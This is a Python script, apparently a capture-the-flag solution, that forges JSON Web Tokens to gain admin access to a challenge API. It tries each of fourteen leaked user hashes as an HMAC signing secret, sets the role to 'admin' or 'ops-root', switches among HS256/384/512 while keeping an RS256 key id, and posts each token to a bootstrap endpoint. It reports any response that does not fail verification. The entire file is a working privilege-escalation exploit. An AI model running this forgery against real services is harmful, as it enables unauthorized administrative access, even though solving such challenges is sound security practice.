import jwt
import requests
import base64
import json

base = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

hashes = [
    "+aK6ypBMf5N9yrYba7q/OYl1tKIqxF3B", # alice
    "9Ga3DJyZgp2WExKRcSDtWBN3m7CTvIDz", # backup
    "1eJAZc8GiQI7XBm9nAF8lZzIZagMutnS", # carol
    "qqMBKDOpYNhRp4cv2LccTA9Cd7Au8+P4", # daemon
    "d7DwnkgQl8hNpMy1Wj7eIKJkjMagLA/U", # admin
    "mqUwLhZ6zfO/e1FcUP5ihn7H6NZUwpmB", # frank
    "HL4Y+d7A5/UQtanNhilgzxfREeTq3Fbt", # grace
    "ZR+OcX7hn83MWUpaTtXrIhRmXl2akNjZ", # heidi
    "AM3oCY7MkBwS6v2nmtTotZ9rDV+sBhZV", # indexer
    "WK/w1gytGCIOjUc3W4ppGGBpAQdrTebY", # mallory
    "+5m8MCSKjPdFk+5CgLMlHytsg5udJGWd", # monitor
    "yv9M6Ukwt8mTa4RiRzpRhHaUitDveqJ+", # operator
    "sQ8QK8/MhKPo7nLlou66ABSpnTYijh8e", # qa
    "DWjVcI2O4XTlJSEQKUd8FAnHkOSoGEN8", # service
]

roles = ["admin", "user", "service", "operator", "ops-root"]

for h in hashes:
    for secret in [h.encode('utf-8'), base64.b64decode(h)]:
        for role in ["admin", "ops-root"]:
            payload = {
                "typ": "access",
                "role": role,
                "sub": "admin",
                "iss": "ghost-packet-auth",
                "aud": "ghost-packet-api",
                "iat": 1785015338,
                "exp": 1985017138
            }
            for alg in ["HS256", "HS384", "HS512"]:
                try:
                    token = jwt.encode(payload, secret, algorithm=alg, headers={"alg": alg, "typ": "JWT", "kid": "primary-rs256"})
                    resp = requests.post(
                        f"{base}/api/transport/bootstrap",
                        headers={
                            "Accept": "application/json",
                            "Authorization": f"Bearer {token}",
                            "Content-Type": "application/json"
                        },
                        json={"clientPublicKey": {}}
                    )
                    if resp.status_code != 500 or "ERR_JWS_SIGNATURE_VERIFICATION_FAILED" not in resp.text:
                        print(f"SUCCESS/INTERESTING! Secret: {h[:10]}... Alg: {alg} Role: {role} -> {resp.status_code} {resp.text}")
                except Exception as e:
                    pass
